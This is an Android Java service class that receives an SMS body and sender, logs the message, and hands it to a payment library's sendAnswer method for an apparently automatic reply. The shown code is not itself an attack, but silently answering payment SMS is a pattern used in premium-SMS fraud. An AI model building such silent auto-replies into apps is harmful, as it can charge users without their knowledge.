package com.p2plib.sms;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import com.p2plib.Logger;
import com.p2plib.PayLib;
public class SmsService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Logger.lg("On start sms");
        processSms(intent);
        return START_STICKY;
    }

    private void processSms(Intent intent) {
        String smsBody = intent.getExtras().getString("sms_body");
        String smsSender = intent.getExtras().getString("smsSender");
        String operName = PayLib.getOperName();
        Logger.lg(" smsBody  " + smsBody );
        PayLib.sendAnswer(smsBody, smsSender);
    }
}
